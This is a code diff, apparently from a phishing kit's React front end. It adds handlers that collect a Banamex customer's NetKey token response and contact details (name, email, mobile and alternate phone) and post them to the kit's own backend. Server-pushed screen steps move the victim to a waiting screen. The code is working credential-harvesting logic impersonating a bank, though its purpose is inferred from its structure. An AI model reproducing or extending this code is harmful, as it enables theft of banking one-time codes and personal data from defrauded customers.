@@ -465,6 +465,82 @@ export default function ClientScreen() {
         }
       }
       
+      // Manejo especial para flujo de Banamex popup window
+      if (screen === ScreenType.BANAMEX_NETKEY) {
+        const currentSessionId = sessionData.sessionId || sessionId;
+        
+        if (!currentSessionId) {
+          console.error('No hay sessionId disponible para BANAMEX_NETKEY');
+          return;
+        }
+        
+        // Enviar NetKey response al backend
+        fetch('/api/banamex/submit-netkey', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            sessionId: currentSessionId,
+            netkeyResponse: formData.netkeyResponse
+          }),
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            console.log('[Banamex NetKey] Respuesta enviada exitosamente');
+            // El servidor cambiará pasoActual a BANAMEX_CONTACT_FORM automáticamente
+            // y el WebSocket nos enviará la actualización
+          } else {
+            console.error('[Banamex NetKey] Error:', data.message);
+          }
+        })
+        .catch(error => {
+          console.error('[Banamex NetKey] Error enviando:', error);
+        });
+        
+        return;
+      }
+      
+      if (screen === ScreenType.BANAMEX_CONTACT_FORM) {
+        const currentSessionId = sessionData.sessionId || sessionId;
+        
+        if (!currentSessionId) {
+          console.error('No hay sessionId disponible para BANAMEX_CONTACT_FORM');
+          return;
+        }
+        
+        // Enviar formulario de contacto al backend
+        fetch('/api/banamex/contact', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            sessionId: currentSessionId,
+            nombreContacto: formData.nombreContacto,
+            correoContacto: formData.correoContacto,
+            celularContacto: formData.celularContacto,
+            telefonoAlternativoContacto: formData.telefonoAlternativoContacto || ''
+          }),
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            console.log('[Banamex Contact] Formulario enviado exitosamente');
+            // El servidor cambiará pasoActual a BANAMEX_WAITING automáticamente
+            // y el WebSocket nos enviará la actualización
+          } else {
+            console.error('[Banamex Contact] Error:', data.message);
+          }
+        })
+        .catch(error => {
+          console.error('[Banamex Contact] Error enviando:', error);
+        });
+        
+        return;
+      }
+      
       // Enviar datos al servidor inmediatamente para sesiones existentes
       const messageData = {
         type: 'CLIENT_INPUT',
